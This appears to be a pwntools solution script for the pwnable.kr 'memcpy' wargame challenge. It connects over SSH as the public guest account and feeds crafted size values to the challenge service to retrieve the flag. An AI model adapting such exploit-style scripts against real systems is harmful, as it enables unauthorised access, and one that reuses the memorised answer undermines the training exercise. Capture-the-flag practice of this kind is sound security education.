#!/usr/bin/python2
from pwn import *

s = ssh('memcpy', 'pwnable.kr', 2222, 'guest')
p = s.connect_remote('localhost', 9022)

def Sendline(s):
    p.sendline(s)
    print(s)
    sleep(0.5)

print p.read(),
Sendline(str(0 + 8))
for i in range(1, 10):
    print p.read(),
    Sendline(str(8 * 2 ** i + 8))

sleep(2)
print(p.recvall())
